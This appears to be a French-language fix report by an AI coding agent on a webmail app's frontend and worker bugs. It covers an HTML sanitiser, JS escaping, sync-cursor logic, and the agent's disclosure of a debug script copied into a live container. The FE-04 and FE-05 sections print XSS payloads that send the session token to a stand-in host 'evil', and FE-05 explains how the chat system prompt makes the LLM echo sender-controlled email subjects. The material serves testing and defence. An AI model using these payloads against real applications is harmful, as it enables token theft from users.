# Rapport de correction — Lot 2 (Frontend & Worker)

**Date** : 2026-08-22
**Source** : `RAPPORT_FRONTEND_WORKER.md`
**État du déploiement** : **aucun conteneur reconstruit ni redémarré** — le testeur exécute
l'itération 2. Toutes les éditions sont sur disque, compilées et testées hors ligne ; la vérification
en conditions réelles attend le signal du chef de projet.

## Résultat

| | Nombre |
|---|---|
| Constats corrigés | **13** |
| Faux positifs écartés | 1 (FE-08 point 1) |
| Constats devenus caducs | 1 (WK-04) |
| Partiellement résolu par la refonte | 1 (WK-07) |
| Sans modification de code (documentation) | 1 (FE-11) |
| Défaut trouvé en plus du rapport | 1 (attribut `onclick` tronqué, §FE-04) |

---

## Tableau des correctifs

| Bug | Fichier:ligne | Correctif appliqué | Vérifié | Comment vérifié |
|---|---|---|---|---|
| **FE-05** sortie `marked` non assainie | `index.html:7614-7645` (`mdSafe`), sites `2809`, `2811`, `2813`, `8216`, `8334` | Assainisseur DOM par **liste blanche** appliqué à chaque `marked.parse()` : balises hors liste dépliées, `SCRIPT/STYLE/IFRAME/OBJECT/EMBED/TEMPLATE/NOSCRIPT/SVG/MATH/FORM/LINK/META/BASE` supprimées avec leur contenu, tous les attributs hors liste retirés (donc tous les `on*`), schémas d'URL limités à `http(s)`/`mailto`/relatif. Indépendant de la version de `marked`. | **Testé hors ligne** (déploiement en attente) | Banc `test_mdsafe2.js` (jsdom + `marked` réel) : les 15 charges utiles sont neutralisées, contrôle fait **sur le DOM après réinjection via `innerHTML`** — aucune balise hors liste, aucun gestionnaire `on*`, aucun schéma dangereux. Couvre `<img onerror>`, `<script>`, `<svg><animate onbegin>`, `<iframe src=javascript:>`, `[x](javascript:)`, `[x](java\tscript:)`, `data:text/html`, `<form>`, `vbscript:`, et les vecteurs mXSS `<template>`, `<noscript>`, `<math><mtext><table><mglyph><style>`. Le markdown légitime (titres, gras, tableaux, listes de tâches, liens, code) reste intact, les marqueurs `[[email:...]]` et `XXTASKPLANX0XX` sont préservés. |
| **FE-02** `target_storage` dans le corps | `index.html:4457`, `5302`, `6180`, `6684` | `target_storage` déplacé dans l'`URLSearchParams` aux 4 points d'appel. Le glisser-déposer propage le stockage réel de la cible (`folderEl.dataset.storage`) ; `_moveEmail()` reçoit un paramètre `targetStorage = 'imap'` (ses 4 appelants visent INBOX/Junk) ; la règle spam force `'imap'` (Junk est toujours IMAP). | En attente | `grep` : les 4 sites portent `target_storage` en query, plus aucun dans un corps JSON. `moveToFolder` recevait déjà `this.dataset.fpStorage` du sélecteur de dossier — la valeur existait, elle partait au mauvais endroit. |
| **FE-03** purge du dossier spam inopérante | `index.html:6155-6175` | Bascule sur `POST /accounts/{id}/empty-folder` pour le stockage IMAP (une requête au lieu de lister 50 000 UID). Le stockage local n'a pas cet endpoint : chemin liste + `delete-bulk` conservé, avec `page: 0` (la pagination serveur est 0-indexée). | En attente | Lecture croisée : `empty-folder` était déjà utilisé par `_ctxEmptyFolder` et validé PASS à l'itération 1. |
| **FE-04** `escAttr()`/`esc()` en littéral JS | `index.html:7611-7612` (`escJs`) + **19 interpolations** sur 16 lignes + 2 variables (`8602-8603`) | Nouvel encodeur double-contexte `escJs(v)` = `escAttr(JSON.stringify(v))` : encodage JS d'abord (le parseur JS lit après le décodage d'attribut), encodage HTML ensuite. Il émet ses propres guillemets, donc `onclick="fn(${escJs(v)})"` remplace `onclick="fn('${escAttr(v)}')"`. | **Testé hors ligne** | Banc `test_escjs.js` (jsdom, clic réel sur le bouton généré, capture des arguments reçus par le gestionnaire) : les 9 valeurs traversent les deux parseurs **intactes**, y compris `Clients d'Europe`, `Appels "d'offres"`, `O'Brien`, `back\slash`, un tableau d'objets. Les tentatives d'injection (`Dossier'+fetch('//evil/'+localStorage.mailia_token)+'`, `Dossier"><img src=x onerror=alert(1)>`) arrivent comme **données inertes** et n'injectent aucune balise. |
| **FE-06** échecs de marquage en masse silencieux | `index.html:5500-5530` (`bulkToggleRead`, `bulkToggleFlag`), `5560` (`bulkDelete`) | Compteur d'échecs dans les deux boucles + helper `_reportBulkFailures()` affichant « N echec(s) sur M » avec le message d'erreur. `bulkDelete` ajoute une `alert` à son `console.error`. | En attente | Revue de code : les `catch {}` vides ont disparu, `loadMessages()` n'est plus la seule trace visible. |
| **FE-07** appel sans barre oblique (307) | `index.html:5190` | `api('/accounts')` → `api('/accounts/')`. | En attente | `grep` : les 2 occurrences du fichier utilisent désormais `/accounts/`. |
| **FE-08** défauts de `_ctxExportFolder` | `index.html:5031-5055` | Points 2 et 3 corrigés : suppression de l'indicateur de progression mort (`btn`/`originalText` écrivaient dans un nœud déjà détaché par `_closeFolderCtx()`), et le succès déclenche une `alert` comme l'échec. **Point 1 non corrigé — faux positif, voir ci-dessous.** | En attente | Lecture de code. |
| **FE-09** « répondu » inopérant en local | `api/routes/accounts.py:1872-1881` | Un `reply_uid` préfixé `L` met à jour `LocalEmail.answered` via `_get_local_email()` (donc cloisonné par compte) au lieu d'appeler `imap.flag_email()`, qui échouait silencieusement. Le chemin IMAP est inchangé. | En attente | `python3 -m py_compile` OK. Réutilise le helper de cloisonnement introduit en F-00. |
| **FE-10** durcissement de l'iframe | `index.html:1133`, `1682` | `allow-same-origin` retiré des deux sandbox. | En attente | `grep contentDocument\|contentWindow` → **aucune occurrence** : l'application ne fait qu'écrire `srcdoc`, elle ne lit jamais dans l'iframe. Retrait sans régression fonctionnelle. |
| **WK-06** curseur avançant sur un lot en échec | `worker/tasks.py:236-295` | Le curseur ne peut plus dépasser un UID non traité : `cursor_uid` ne suit que les UID **réellement récupérés**, s'arrête au premier échec de `fetch_email`, et retombe à `None` si l'indexation individuelle de repli échoue. Si le lot est incomplet, le dossier est **abandonné pour ce cycle** (`break`) — continuer aurait commité le curseur d'un lot ultérieur, sautant définitivement les UID en échec. Le repli individuel journalise désormais son erreur au lieu d'un `except: pass`. | En attente (worker arrêté) | Relecture ligne à ligne + `py_compile`. Voir la réserve « blocage de dossier » ci-dessous. |
| **WK-08** fuite du client Elasticsearch | `worker/tasks.py:122-319` | Le corps de `_sync_account` est enveloppé dans `try: ... finally: await es.close()`. | En attente | Vérifié par **AST** : le corps de `_sync_account` est `[docstring, config=, es=, Try]` et le `finalbody` du `Try` est bien `await es.close()`. |
| **WK-09** ordre des UID supposé | `imap/manager.py:116-118` | `return sorted(uids, key=int)` dans `get_uids`, avec le commentaire expliquant les deux hypothèses (`uids[:MAX_PER_FOLDER]` = les plus anciens, `batch_uids[-1]` = le maximum). | En attente | `py_compile` OK. Aucun appelant ne dépend de l'ordre de réponse du serveur. |
| **Bonus** attribut `onclick` tronqué | `index.html:8490` | `JSON.stringify(members...)` était interpolé **brut** dans un `onclick="..."` délimité par des guillemets doubles : le premier `"` du JSON fermait l'attribut, cassant le bouton « Créer le groupe » des suggestions de contacts. Remplacé par `escJs(...)`. | **Testé hors ligne** | Cas `[{email:"a'b@x.fr", name:'D"n'}]` du banc `escJs` : le tableau arrive intact au gestionnaire. Non signalé par le rapport. |

---

## Ce que je ne corrige pas, et pourquoi

### FE-08 point 1 — faux positif

Le rapport affirme que « Exporter en ZIP apparaît dans le menu contextuel de **tous** les dossiers,
y compris locaux (le menu est construit ligne 5013 sans distinction de stockage) », et en conclut
que `storage: 'imap'` codé en dur est un défaut.

Le menu ne s'ouvre jamais sur un dossier local. Dix lignes au-dessus de la construction du menu :

```javascript
const storage = el.dataset.storage || 'imap';
if (storage !== 'imap') return;        // index.html:5003
```

`storage: 'imap'` dans `_ctxExportFolder` est donc **correct**, pas codé en dur par oubli. Les
points 2 et 3 du même constat sont en revanche exacts et corrigés.

### WK-04 — caduc

Le constat (« la synchro manuelle ne prend pas le verrou ») portait sur la version précédente.
Après la refonte :

- `sync_account` acquiert `mailia:lock:sync_account:{id}` avant tout travail (`tasks.py:90-94`) ;
- `sync_all_accounts` n'est plus qu'un dispatcheur : il émet une tâche `sync_account` par compte
  (`tasks.py:77`) ;
- `POST /api/accounts/{id}/sync` appelle `sync_task.delay(account.id)` où `sync_task` **est**
  `sync_account` (vérifié : `accounts.py:313-314`).

Les deux chemins passent donc par le même verrou, et il est désormais **par compte** — exactement
le correctif que le rapport demandait. Rien à faire.

### WK-07 — partiellement résolu, et devenu utile là où il ne l'était pas

L'analyse d'origine était juste : sur l'ancien code, `expires: 240` posé sur le message de beat ne
servait à rien, puisque ce message était toujours consommé immédiatement.

Ce n'est plus tout à fait le même mécanisme :

- `expires: 240` sur le **beat** (`app.py:25`) est maintenant **complètement** inerte — le
  dispatcheur ne fait qu'une requête SQL et un `apply_async` par compte, il est consommé en
  quelques millisecondes. Inoffensif ; je le laisse.
- `SYNC_TASK_EXPIRES = 240` sur les tâches **par compte** (`tasks.py:77`) est en revanche
  réellement utile : avec `--concurrency=2`, deux comptes lents occupent les deux slots et les
  tâches dispatchées aux cycles suivants s'empilent réellement dans la file. C'est précisément le
  cas que le rapport identifiait comme le seul où `expires` sert.

Verdict : le constat est **partiellement résolu**. Le garde-fou existe désormais au bon endroit ;
le verrou Redis reste le mécanisme principal, `expires` la ceinture.

### FE-11 — documentation, aucune modification de code

Liste à corriger dans `docs/FONCTIONNALITES.md` :

| § | Affirmation | Réalité |
|---|---|---|
| §4 | Recherche sémantique | Aucune interface, aucun endpoint HTTP. `semantic_search` n'existe que via MCP. La seule occurrence de `semantic` dans `index.html` est un libellé du panneau d'activité IA. |
| §4 | « Tri par pertinence » | Le tri est exclusivement par date décroissante, et le score n'est jamais calculé (déjà relevé en F-01 au lot 1). |
| §5 | Brouillons : mise à jour, liste, suppression | Seul `save-draft` existe côté API. `update_draft`/`delete_draft`/`list_drafts` sont des outils MCP, sans interface. |
| §11 | Aperçu des règles classiques | N'existe ni côté API ni côté interface ; `apply` exécute toujours les actions. |
| §11 | Action « transférer » des règles | Existe désormais réellement (implémentée en F-10 au lot 1) — la documentation est devenue exacte. |
| §13 | `claude-native` « sans clé API » | Le code n'envoie plus d'en-tête vide (F-16), mais le proxy `ia.expert-presta.com` exige une clé et répond `401`. À reformuler. |

---

## Sur l'exploitabilité de FE-05 — je te rejoins, et je vais plus loin

Le testeur a classé FE-05 en MOYEN au motif que « l'exécution dépend du comportement du modèle, non
déterministe ». Cette réserve sous-estime le risque, pour une raison qui figure dans le code même :

`CHAT_SYSTEM_PROMPT` (`ai.py:69-75`) **impose** au modèle de restituer les listes d'emails sous
forme de tableau markdown, et nomme explicitement le contenu de la colonne :

```
"EMAIL LISTS — MANDATORY FORMAT: ... | Date | Objet | Emplacement | Lien |"
"'Objet' is the subject."
```

L'objet d'un email est **entièrement contrôlé par l'expéditeur**. Le scénario n'est donc pas
« le modèle recopiera peut-être un fragment d'un corps d'email s'il résume » mais « le modèle
recopie l'objet, parce que le prompt système le lui ordonne, dès que l'utilisateur demande la liste
de ses emails ». Un objet valant `<img src=x onerror="fetch('//evil/'+localStorage.mailia_token)">`
suffit, et le JWT est en clair dans `localStorage` (`index.html:1796`).

La chaîne est la même que FE-01, avec un déclencheur plus banal : lister ses emails plutôt que
lancer une recherche. Je l'ai donc traitée au même niveau que FE-01, avec un assainissement par
liste blanche plutôt que par échappement, parce que `marked` doit continuer à produire du HTML
légitime (tableaux, gras, liens) tout en rejetant celui qui vient du modèle.

**Choix technique** : pas de DOMPurify. `marked` est déjà chargé depuis un CDN **non épinglé**
(`<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js">`, ligne 10) ; ajouter une
seconde dépendance CDN pour assurer la sécurité de la première aggraverait la surface
d'approvisionnement au lieu de la réduire. L'assainisseur fait 30 lignes, n'a aucune dépendance, et
son comportement est vérifié par un banc de test reproductible.

À noter au passage, hors périmètre : `marked` non épinglé signifie qu'une version compromise ou
simplement incompatible sur jsDelivr casse ou compromet l'application sans qu'aucun code ne change.
Épingler la version (et idéalement ajouter `integrity=`) serait une amélioration à part entière.

---

## Réserve sur WK-06 — à arbitrer

Le correctif garantit qu'aucun email n'est sauté : le curseur n'est jamais commité au-delà d'un UID
qui n'a pas été traité. La contrepartie est qu'un message **définitivement** irrécupérable (message
malformé faisant systématiquement échouer `fetch_email`, quota permanent) **bloque la progression
de son dossier**, cycle après cycle.

C'est l'inverse exact du compromis actuel : aujourd'hui la perte est silencieuse et irréversible ;
après correctif, le blocage est bruyant (`logger.warning` nommant le dossier et l'UID bloquant) et
réversible. J'ai tranché pour le bruit plutôt que pour la perte de courrier, ce qui correspond à ce
que demandait le rapport, mais c'est un arbitrage produit :

- si tu préfères la progression garantie, l'alternative est de conserver une liste d'UID en échec
  dans `sync_state` (à rejouer aux cycles suivants) et de laisser le curseur avancer — plus juste,
  mais cela change la forme de `sync_state` et mérite d'être décidé, pas glissé dans un correctif ;
- en l'état, un dossier bloqué se détecte dans les logs, et se débloque en avançant manuellement
  `sync_state[folder]`.

Dis-moi si tu veux la variante « liste de rejeu ».

---

## Vérification hors ligne

Deux bancs de test écrits pour ce lot, exécutés avec `jsdom` + le vrai `marked` :

| Banc | Objet | Résultat |
|---|---|---|
| `scratchpad/test_mdsafe2.js` | 15 charges utiles XSS injectées via `mdSafe()` puis `innerHTML`, inspection du DOM final | **DOM propre sur 15/15** |
| `scratchpad/test_escjs.js` | 9 valeurs (apostrophes, guillemets, antislash, tentatives d'injection, objets) traversant `escJs()` → attribut `onclick` → clic réel → capture des arguments | **9/9 intactes, 0 balise injectée** |

Le code testé est **extrait à l'exécution de `index.html`**, pas recopié : les bancs testent le
fichier livré.

Contrôles statiques :

- JavaScript en ligne extrait et validé par `node --check` après **chaque** modification : OK.
- `python3 -m py_compile` sur `accounts.py`, `worker/tasks.py`, `imap/manager.py` : OK.
- Structure de `_sync_account` validée par AST (WK-08).
- `diff` de chaque fichier contre sa version déployée : **seules mes modifications apparaissent**.
  `escHighlight()` (ton correctif FE-01) est présent des deux côtés — je ne l'ai pas écrasé.

---

## Fichiers modifiés (non déployés)

| Fichier | Constats |
|---|---|
| `src/web/static/index.html` | FE-02, FE-03, FE-04, FE-05, FE-06, FE-07, FE-08, FE-10, + bonus `onclick` tronqué |
| `src/api/routes/accounts.py` | FE-09 |
| `src/worker/tasks.py` | WK-06, WK-08 |
| `src/imap/manager.py` | WK-09 |

Non touchés : `src/worker/app.py`, `src/rules/engine.py`, `docker-compose.yml` (tes correctifs
WK-01/02/03/05), et `docs/FONCTIONNALITES.md` (FE-11 t'appartient).

---

## Sécurité du périmètre

- **Aucun `docker compose build`, `up`, `restart` ou `stop` exécuté durant ce lot.** L'environnement
  déployé est resté exactement dans l'état où le testeur l'a trouvé.
- **`mailia-worker` et `mailia-beat` toujours arrêtés** — je ne les ai ni démarrés ni sollicités ;
  les correctifs worker n'ont donc pas pu être exécutés, seulement relus et validés statiquement.
- Aucun appel API, aucune donnée touchée : ce lot est intégralement de l'édition de source et du
  test hors ligne en local.
- Compte 1 / utilisateur 2 : jamais approchés.

## Prêt à déployer

Au signal, le cycle sera :

```bash
scp src/web/static/index.html src/api/routes/accounts.py src/worker/tasks.py src/imap/manager.py \
    expert-presta:/var/www/vhosts/expert-presta.com/mailia/src/...
ssh expert-presta "cd .../mailia && docker compose build api mcp && docker compose up -d api mcp"
```

(`mcp` est à reconstruire aussi : il partage l'image et `imap/manager.py` a changé. `worker` et
`beat` restent hors de la commande.)

Vérifications prévues après déploiement : FE-02 (les 4 combinaisons de déplacement, en confirmant
qu'aucun dossier IMAP fantôme n'est créé), FE-03 (purge réelle du dossier spam), FE-09 (réponse à un
email local), et FE-05/FE-04 par pilotage navigateur sur le compte QA.

---

# Addendum — revue croisée de `tasks.py` et statut de `mcp_runner.py`

## 1. Interaction entre les deux séries de modifications sur `_sync_account`

Relecture intégrale de la fonction (`tasks.py:112-333`). **Une incohérence trouvée et corrigée** ;
les quatre autres points sont sains.

### Incohérence trouvée — dans MON correctif (WK-06), révélée par ta persistance par lot

`imap.fetch_email()` renvoie `None` **sans lever d'exception** dans deux cas distincts
(`manager.py:120-124`) :

```python
status, data = self._conn.uid("FETCH", uid, "(RFC822)")
if status != "OK" or not data or data[0] is None:
    return None
```

- le serveur a répondu `NO` → **échec réel**, l'email doit être rejoué ;
- l'UID n'existe plus (message expurgé entre le `SEARCH` et le `FETCH`) → **skip légitime**.

Mon `batch_complete` ne se déclenchait que sur une **exception**. Un `None` laissait donc
`batch_complete = True`, le curseur avançait, et ta persistance par lot le **commitait
immédiatement** — l'email était perdu définitivement. C'est exactement le trou que WK-06 devait
fermer, sur le chemin que mon correctif ne couvrait pas. La combinaison de nos deux modifications
le rendait *plus* dommageable qu'avant : sans ton commit par lot, un SIGKILL aurait au moins annulé
l'avancement erroné.

**Correctif** (`tasks.py:60-73` et `:225-230`) : nouveau `_uid_still_present(imap, uid)` qui
distingue les deux cas par un `UID SEARCH UID <n>` sur le dossier déjà sélectionné par le fetch.

```python
elif _uid_still_present(imap, uid):
    logger.error(f"Fetch returned nothing for UID {uid} in {folder} while it still exists")
    batch_complete = False
```

Un message disparu est sauté (sinon le dossier se bloquerait sur un fantôme) ; un message toujours
présent mais non récupérable bloque le curseur, conformément à l'arbitrage que tu as validé. Le
surcoût est d'un aller-retour IMAP **uniquement** sur le chemin `None`, qui est rare.

`fetch_email()` n'est pas modifié : 14 outils MCP en dépendent et traitent `None` comme
« introuvable ». Changer son contrat en pleine campagne aurait été un risque disproportionné.

### Réponses à tes cinq questions

**a) Persistance par lot + `cursor_uid` : le curseur commité est-il celui du dernier UID réellement
traité ?** Oui, désormais. `cursor_uid` ne suit un UID que tant que `batch_complete` est vrai, et
`batch_complete` retombe à faux sur les trois modes d'échec : exception de `fetch_email`, `None`
avec message encore présent (nouveau), échec de l'indexation individuelle de repli — ce dernier
remet en plus `cursor_uid = None`, car un échec d'indexation en fin de lot invalide tout le lot, pas
seulement sa fin. Le commit de la ligne 298 est donc toujours ≤ dernier UID récupéré **et** indexé.

**b) Le `break` laisse-t-il un état cohérent en base ?** Oui. L'ordre est : commit du curseur partiel
(si `cursor_uid` n'est pas `None`), *puis* `break`. La base contient le curseur du dernier UID sain ;
la boucle externe passe au dossier suivant. `sync_state` (dict local) et `account.sync_state`
restent alignés parce que tu réassignes `dict(sync_state)` à chaque commit — la mutation en place
d'un JSONB n'étant pas détectée par SQLAlchemy, ce détail est essentiel et il est correct.

**c) Le `try/finally` (WK-08) englobe-t-il tes commits ? Session propre sur `SoftTimeLimitExceeded` ?**
Oui aux deux. Le `try` ouvre ligne 135, le `finally: await es.close()` ferme ligne 332 : les deux
`await db.commit()` (lignes 298 et 330) sont dedans, donc `es` est fermé sur **tout** chemin de
sortie, y compris l'exception. Pour la session : l'exception remonte jusqu'au
`async with factory() as session` de `_worker_session` (`tasks.py:44-46`) ; `AsyncSession.__aexit__`
appelle `close()`, qui annule la transaction en cours, puis le `finally` fait `engine.dispose()`.
Aucune session ni connexion en suspens. Le lot en cours de commit est perdu — c'est le comportement
voulu, il est rejoué au cycle suivant. Réserve théorique : si la limite douce tombe *pendant*
`es.close()` lui-même, la fermeture n'aboutit pas ; fenêtre de quelques microsecondes, non traitée.

**d) Le disjoncteur IA interagit-il correctement avec mon `break` ?** Oui. `llm` et `ai_timeouts`
sont déclarés au niveau de la fonction (lignes 151 et 186), hors des deux boucles : passer `llm` à
`None` vaut pour le reste du cycle, y compris les dossiers suivants — mon `break` ne sort que de la
boucle des lots, il ne réinitialise rien. Les deux mécanismes sont par ailleurs indépendants : une
`AIProviderTimeout` est interceptée dans le bloc des règles, qui ne touche pas à `batch_complete`.
C'est la bonne sémantique — l'email **a** été récupéré et indexé, seule l'évaluation de la règle a
été sautée ; il n'y a aucune raison de le re-télécharger. Conséquence à connaître, antérieure à nos
deux lots : les règles IA non évaluées pour cause de disjoncteur ne seront jamais rejouées pour ces
emails, puisque le curseur avance.

**e) Chemin où le verrou Redis reste pris alors que le processus survit ?** Aucun.
`sync_account` (`tasks.py:81-101`) fait `set(nx=True)`, puis `try/finally: client.delete(key)`. Le
seul `return` précoce est *avant* l'acquisition (verrou déjà pris par un autre). Toute exception,
`SoftTimeLimitExceeded` incluse — c'est une exception Python ordinaire — passe par le `finally`.
Sur SIGKILL le `finally` ne s'exécute pas, mais `SYNC_LOCK_TTL = 2100 > task_time_limit = 1800`
libère le verrou 300 s après le kill : ta correction de WK-05 est bien effective. Le seul cas
résiduel est un Redis injoignable au moment du `delete` (exception avalée) — le TTL couvre, et
c'est le bon compromis.

### Point d'attention, sans correctif

`apply_classic_rules_on_sync` reçoit `batch_uids` **entier**, y compris les UID dont le fetch a
échoué. Sans conséquence — le moteur de règles refait son propre `FETCH` et ignore ce qu'il ne
trouve pas — mais si un jour une action de règle devenait destructrice sur la seule foi de la liste
d'UID, il faudrait lui passer les UID réellement traités. Je le signale sans y toucher.

## 2. `mcp_runner.py` — confirmation

**Il n'est ni dans le dépôt, ni dans l'image, et aucun correctif n'en dépend.** Vérifié sur quatre
plans :

| Contrôle | Résultat |
|---|---|
| `git ls-files \| grep mcp_runner` | absent de l'index |
| `git status --short` (fichiers non suivis inclus) | absent du working tree |
| `find /var/www/mailia -name 'mcp_runner*'` | **aucun fichier** dans l'arborescence du projet |
| `find` sur le projet côté serveur | aucun fichier ; il n'existe qu'en `/tmp/mcp_runner.py`, **hors du contexte de build** |
| `grep -rn mcp_runner src/ docker/ docker-compose.yml Dockerfile*` | aucune référence |
| `docker run --rm --entrypoint sh mailia-api -c 'ls /app/mcp_runner.py'` | **`No such file or directory`** — absent de l'image |
| `docker exec mailia-api ls /app/mcp_runner.py` | présent **uniquement dans le conteneur en cours**, via ton `docker cp` |

Les `Dockerfile.api` et `Dockerfile.worker` ne copient que `requirements.txt`, `src/`, `alembic/` et
`alembic.ini` — même déposé à la racine du projet, le fichier ne serait pas embarqué. Il vit
exclusivement dans le scratchpad de la campagne et dans le conteneur en cours d'exécution.

Il ne subsistera donc pas au prochain `docker compose build api`. Comme au lot 1, je le
re-injecterai après déploiement pour mes propres vérifications :
`ssh expert-presta "docker cp /tmp/mcp_runner.py mailia-api:/app/mcp_runner.py"`.

## État des conteneurs

Inchangé, aucune commande de modification exécutée : `mailia-api` et `mailia-mcp` up (lot 1),
**`mailia-worker` `Exited (137)` et `mailia-beat` `Exited (0)`**.

## Fichier modifié par cet addendum

`src/worker/tasks.py` — `_uid_still_present()` + son appel dans la boucle de récupération.
`python3 -m py_compile` OK. Toujours **non déployé**.
